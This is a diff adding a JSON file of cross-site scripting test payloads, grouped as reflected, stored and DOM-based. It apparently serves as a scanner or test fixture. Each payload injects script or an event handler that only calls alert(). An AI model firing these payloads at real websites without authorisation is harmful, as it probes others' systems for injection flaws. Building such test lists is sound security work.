@@ -1,0 +1,21 @@
+
+{
+    "reflected": [
+        "?q=<script>alert(1)</script>",
+        "?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "?q=<img src=x onerror=alert(1)>",
+        "?input=<svg/onload=alert('xss')>"
+    ],
+    "stored": [
+        "<script>alert('stored')</script>",
+        "<img src=x onerror=alert('stored XSS')>",
+        "<svg/onload=alert('stored')>",
+        "<body onload=alert('stored xss')>"
+    ],
+    "dom-based": [
+        "javascript:alert(1)",
+        "#<script>alert(document.domain)</script>",
+        "?redirect=<img src=x onerror=alert(location)>",
+        "?param=<iframe src='javascript:alert(1)'>"
+    ]
+}
